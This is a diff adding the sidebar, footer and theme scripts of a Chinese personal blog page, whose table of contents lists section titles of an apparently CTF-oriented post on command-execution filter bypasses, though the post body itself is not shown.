+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="nav-number">1.</span> <span class="nav-text">常见的系统命令执行函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%A1%E9%81%93%E7%AC%A6-amp-%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="nav-number">2.</span> <span class="nav-text">管道符&amp;通配符</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#windows-%E4%B8%8B"><span class="nav-number">2.1.</span> <span class="nav-text">windows 下</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-%E4%B8%8B"><span class="nav-number">2.2.</span> <span class="nav-text">Linux 下</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-number">3.</span> <span class="nav-text">空格绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="nav-number">4.</span> <span class="nav-text">黑名单绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cat%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="nav-number">5.</span> <span class="nav-text">cat被过滤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8B%AC%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="nav-number">6.</span> <span class="nav-text">括号被过滤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E6%95%9B%E6%89%A7%E8%A1%8C"><span class="nav-number">7.</span> <span class="nav-text">内敛执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8ls-t%E5%92%8C-gt-%E4%BB%A5%E5%8F%8A%E6%8D%A2%E8%A1%8C%E7%AC%A6%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4-%E6%96%87%E4%BB%B6%E6%9E%84%E9%80%A0%E7%BB%95%E8%BF%87"><span class="nav-number">8.</span> <span class="nav-text">利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bin"><span class="nav-number">9.</span> <span class="nav-text">bin&#x2F;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#post%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">10.</span> <span class="nav-text">post上传文件进行命令执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E5%90%8D%E6%9E%84%E9%80%A0"><span class="nav-number">11.</span> <span class="nav-text">无参数文件名构造</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#glob%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E5%90%8D"><span class="nav-number">12.</span> <span class="nav-text">glob遍历文件名</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#mysql%E7%9A%84load-file%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="nav-number">13.</span> <span class="nav-text">mysql的load_file读文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FFI"><span class="nav-number">14.</span> <span class="nav-text">FFI</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0%E7%99%BD%E5%90%8D%E5%8D%95%E8%BF%87%E6%BB%A4"><span class="nav-number">15.</span> <span class="nav-text">数学函数白名单过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8"><span class="nav-number">15.1.</span> <span class="nav-text">数学函数利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HeaderRCE"><span class="nav-number">15.2.</span> <span class="nav-text">HeaderRCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%82%E6%88%96"><span class="nav-number">15.3.</span> <span class="nav-text">异或</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux%E4%B8%AD%E5%86%85%E7%BD%AE%E7%9A%84bash%E5%8F%98%E9%87%8F"><span class="nav-number">16.</span> <span class="nav-text">Linux中内置的bash变量</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86path%E6%97%B6"><span class="nav-number">16.1.</span> <span class="nav-text">过滤了path时</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86SHLVL%E6%97%B6"><span class="nav-number">16.2.</span> <span class="nav-text">过滤了SHLVL时</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-%E5%92%8CPWD%E6%97%B6"><span class="nav-number">16.3.</span> <span class="nav-text">过滤了#和PWD时</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="安小琪"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">安小琪</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">101</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/npfs06" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;npfs06" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:npfs066@gmail.com" title="E-Mail → mailto:npfs066@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://hyluz.cn/" title="https:&#x2F;&#x2F;hyluz.cn&#x2F;" rel="noopener" target="_blank">Luz</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://0clickjacking0.github.io/" title="https:&#x2F;&#x2F;0clickjacking0.github.io&#x2F;" rel="noopener" target="_blank">xianyu123</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://jiang-niao.github.io/" title="https:&#x2F;&#x2F;jiang-niao.github.io&#x2F;" rel="noopener" target="_blank">JiangNiao</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://xiaolong22333.top/" title="https:&#x2F;&#x2F;xiaolong22333.top&#x2F;" rel="noopener" target="_blank">xiaolong</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+
+
+<!--
+ <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+-->
+
+
+  <span class="author" itemprop="copyrightHolder">安小琪</span>
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2020030100号 </a>
+  </div>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  let url = element.dataset.target;
+  let pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  let fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'nhITwFwMLqOi81E1nOPXx9Iw-MdYXbMMI',
+      appKey     : 'F9l5INUqgwxvbJOfC1X7OMnr',
+      placeholder: "欢迎在这里留言！我看到一定会及时回复的噢 （PS：回复信息会自动发送到你所填写的邮箱噢）",
+      avatar     : '',
+      meta       : guest,
+      pageSize   : '6' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
